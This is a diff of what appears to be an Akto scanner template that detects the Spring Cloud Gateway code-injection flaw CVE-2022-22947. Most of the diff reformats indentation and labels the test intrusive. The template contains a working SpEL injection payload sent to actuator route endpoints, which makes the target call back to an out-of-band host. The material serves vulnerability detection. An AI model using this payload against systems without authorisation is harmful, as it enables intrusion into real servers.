@@ -2,7 +2,7 @@ id: SPRING_CLOUD_GATEWAY_CODE_INJECTION
 info:
   name: Spring Cloud Gateway Code Injection
   description: "This vulnerability allows attackers to inject and execute malicious code in Spring Cloud Gateway applications. This flaw arises due to improper validation of input, enabling attackers to exploit the system by sending crafted requests. Once compromised, attackers can control the application, leading to unauthorized access, data leaks, or further exploitation of the underlying infrastructure. This vulnerability poses a high security risk to affected systems."
-  details:  "This vulnerability occurs due to insufficient input validation in Spring Cloud Gateway, allowing attackers to inject and execute arbitrary code through crafted HTTP requests. This can lead to unauthorized access or control over the application. The vulnerability affects specific versions of Spring Cloud Gateway, and attackers could leverage this flaw to compromise sensitive data or escalate privileges within the system. Applying patches or updates is essential to mitigate this risk."
+  details: "This vulnerability occurs due to insufficient input validation in Spring Cloud Gateway, allowing attackers to inject and execute arbitrary code through crafted HTTP requests. This can lead to unauthorized access or control over the application. The vulnerability affects specific versions of Spring Cloud Gateway, and attackers could leverage this flaw to compromise sensitive data or escalate privileges within the system. Applying patches or updates is essential to mitigate this risk."
   impact: "The impact of this vulnerability is significant, as it allows attackers to execute arbitrary code within the Spring Cloud Gateway application. This can lead to full compromise of the application, including unauthorized access to sensitive data, disruption of services, and potential control over the underlying infrastructure. Exploitation of this flaw could result in severe security breaches and data loss."
   category:
     name: INJECT
@@ -17,6 +17,8 @@ info:
     - CWE-16
   cve:
     - CVE-2022-22947
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -39,41 +41,41 @@ execute:
   type: multiple
   requests:
     - req:
-      - modify_method: POST
-      - modify_url: "/actuator/gateway/routes/abcdefgh"
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - replace_body: '{"predicates": [{"name": "Path","args": {"_genkey_0": "/abcdefgh/**"}}],"filters": [{"name":"RewritePath","args": {"_genkey_0": "#{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")}","_genkey_1": "/${path}"}}],"uri": "${urlVar}","order": 0}'
-      - validate:
-          response_code:
-            gte: 505
-      - success: x2
-      - failure: exit
+        - modify_method: POST
+        - modify_url: "/actuator/gateway/routes/abcdefgh"
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - replace_body: '{"predicates": [{"name": "Path","args": {"_genkey_0": "/abcdefgh/**"}}],"filters": [{"name":"RewritePath","args": {"_genkey_0": "#{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")}","_genkey_1": "/${path}"}}],"uri": "${urlVar}","order": 0}'
+        - validate:
+            response_code:
+              gte: 505
+        - success: x2
+        - failure: exit
     - req:
-      - modify_method: POST
-      - modify_url: "/actuator/gateway/refresh"
-      - replace_body: '{"predicate": "Paths: [/abcdefgh], match trailing slash: true","route_id": "abcdefgh","filters": ["[[RewritePath #{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")} = /${path}], order = 1]"],"uri": "${urlVar}","order": 0}'
-      - validate:
-          response_code:
-            gte: 505
-      - success: x3
-      - failure: exit  
+        - modify_method: POST
+        - modify_url: "/actuator/gateway/refresh"
+        - replace_body: '{"predicate": "Paths: [/abcdefgh], match trailing slash: true","route_id": "abcdefgh","filters": ["[[RewritePath #{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")} = /${path}], order = 1]"],"uri": "${urlVar}","order": 0}'
+        - validate:
+            response_code:
+              gte: 505
+        - success: x3
+        - failure: exit
     - req:
-      - modify_method: DELETE
-      - modify_url: "/actuator/gateway/routes/abcdefgh"
-      - replace_body: '{}'
-      - validate:
-          response_code:
-            eq: 201
-          response_payload:
-            length:
-              gt: 0
-          ssrf_url_hit: ${random_uuid}
-          response_headers:
-            for_one:
-              key: 
-                regex: ".*"
-              value:
-                contains_either:  "/routes/abcdefgh" 
-      - success: vulnerable
-      - failure: exit          
+        - modify_method: DELETE
+        - modify_url: "/actuator/gateway/routes/abcdefgh"
+        - replace_body: '{}'
+        - validate:
+            response_code:
+              eq: 201
+            response_payload:
+              length:
+                gt: 0
+            ssrf_url_hit: ${random_uuid}
+            response_headers:
+              for_one:
+                key:
+                  regex: ".*"
+                value:
+                  contains_either: "/routes/abcdefgh"
+        - success: vulnerable
+        - failure: exit
